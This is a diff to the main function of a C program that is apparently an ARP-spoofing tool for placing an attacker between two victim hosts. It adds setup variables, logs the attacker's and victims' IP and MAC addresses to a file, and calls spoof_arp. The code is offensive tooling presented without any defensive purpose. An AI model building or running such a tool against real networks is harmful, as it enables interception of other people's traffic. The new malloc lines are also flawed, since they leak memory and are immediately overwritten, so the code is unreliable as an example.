@@ -178,10 +178,12 @@ int main(int argc, char *argv[])
     int sock;
     struct sockaddr_ll device;
 
-    char *victim_ip_1, *victim_ip_2, *interface;
-    unsigned char *hacker_mac = NULL;
-    unsigned char *victim_mac_1 = NULL;
-    unsigned char *victim_mac_2 = NULL;
+    char *interface     = malloc(sizeof(char) * 20);
+    char *victim_ip_1   = malloc(sizeof(char) * 20);
+    char *victim_ip_2   = malloc(sizeof(char) * 20);
+    char *victim_mac_1  = malloc(sizeof(char) * 20);
+    char *victim_mac_2  = malloc(sizeof(char) * 20);
+    char *hacker_mac    = malloc(sizeof(char) * 20);
 
     victim_ip_1 = argv[1];
     victim_ip_2 = argv[2];
@@ -240,6 +242,19 @@ int main(int argc, char *argv[])
     }
 
     victim_mac_2 = get_victim_mac(sock, victim_ip_2);
+
+    FILE *logfile=fopen("ipmacinfo","w");
+    if(logfile == NULL) {
+        printf("Unable to create ipmacinfo file.");
+        return EXIT_FAILURE;
+    }
+    fprintf(logfile, "%s\n", interface);
+    PRINT_MAC_ADDRESS(logfile, hacker_mac);
+    fprintf(logfile, "%s\n", victim_ip_1);
+    fprintf(logfile, "%s\n", victim_ip_2);
+    PRINT_MAC_ADDRESS(logfile, victim_mac_1);
+    PRINT_MAC_ADDRESS(logfile, victim_mac_2);
+    fclose(logfile);
 
     spoof_arp(sock, &device, hacker_mac,
               victim_ip_1, victim_mac_1,
